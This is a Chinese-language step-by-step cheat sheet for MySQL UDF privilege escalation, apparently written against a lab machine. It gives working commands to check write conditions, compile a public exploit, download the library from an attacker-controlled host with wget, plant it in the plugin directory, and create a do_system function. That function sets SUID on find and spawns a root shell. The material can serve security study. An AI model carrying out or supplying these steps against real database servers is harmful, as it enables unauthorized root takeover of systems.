# UDF提权

要注意先要进到/var/www/目录底下，这里面才有信息

```c
dpkg -l | grep mysql   --查看历史安装包版本，就知道写入条件的判断依据了
1.看一下是否满足写入条件：
	show global variables like 'secure%';
	+------------------+-------+
	| Variable_name    | Value |
	+------------------+-------+
	| secure_auth      | OFF   |
	| secure_file_priv |       |
	+------------------+-------+
	2 rows in set (0.00 sec)

	1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权
	2）当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/目录下，此时也无法提权
	3）当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!
	如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。
	在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
	在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

2.查看插件目录：
	show variables like '%plugin%';
	+---------------+------------------------+
	| Variable_name | Value                  |
	+---------------+------------------------+
	| plugin_dir    | /usr/lib/mysql/plugin/ |
	+---------------+------------------------+
	1 row in set (0.00 sec)

3.查看能否远程登陆：
	use mysql;
	select user,host from user;
	+------------------+-----------+
	| user             | host      |
	+------------------+-----------+
	| root             | 127.0.0.1 |
	| root             | ::1       |
	| debian-sys-maint | localhost |
	| root             | localhost |
	| root             | raven     |
	+------------------+-----------+
	5 rows in set (0.00 sec)
	发现这里root用户不允许远程登陆，因此不能利用MSF提权。

	谷歌搜索：mysql 5.x UDF exploit  或者  searchsploit udf 
	gcc -g -c 1518.c   ---GCC编译.o文件
	gcc -g -shared -o rong.so 1518.o -lc
	-g 生成调试信息
	-c 编译（二进制）
	-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。
	-o：执行命令后的文件名
	-lc：-l 库 c库名
	传递exp
	开启python的传输服务
	wget http://10.211.55.19:8081/dayu.so  --靶机执行

	show databases;
	use mysql
	select database();

4. 进入数据库创建数据表rong：
	create table rong(line blob);  --这里longblob根据大小来分配
	类型           大小(单位：字节) 
	TinyBlob      最大 255 
	Blob          最大 65K 
	MediumBlob    最大 16M 
	LongBlob      最大 4G 

5. 插入数据文件：
	insert into rong values(load_file('/tmp/rong.so'));
	或
	insert into rong values(load_file('/var/www/html/rong.so'));
	rong表成功插入二进制数据，然后利用dumpfile函数把文件导出，outfile 多行导出，dumpfile一行导出
	outfile会有特殊的转换，而dumpfile是原数据导出！

6. 新建存储函数：
	select * from rong into dumpfile '/usr/lib/mysql/plugin/rong.so';    ---把这个rong.so导入到插件库中
	创建自定义函数do_system，类型是integer，别名（soname）文件名字，然后查询函数是否创建成功：
	create function do_system returns integer soname 'rong.so';

7. 查看以下创建的函数：
	select * from mysql.func;
	调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：
	select do_system('chmod u+s /usr/bin/find');

8. 执行find命令
	使用find执行 shell
	touch rong
	find rong -exec "/bin/sh" \;
	或者：find rong -exec "id" \;
```
